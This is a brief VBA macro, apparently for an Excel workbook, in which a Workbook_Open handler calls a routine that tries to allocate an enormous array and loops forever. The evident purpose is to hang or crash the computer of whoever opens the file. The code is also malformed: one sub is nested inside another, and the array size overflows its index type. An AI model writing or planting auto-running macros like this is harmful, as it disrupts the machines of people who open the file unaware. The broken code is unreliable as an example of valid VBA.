Sub OhSnap()
    Dim corruptable() As Variant
    Dim i As Long
    
    ReDim corruptable(1 To 1E+62)
    
    Do
        For i = LBound(corruptable) To UBound(corruptable)
            corruptable(i) = i
        Next i
        
    Loop While True

Private Sub Workbook_Open()
    Call OhSnap
End Sub

End Sub
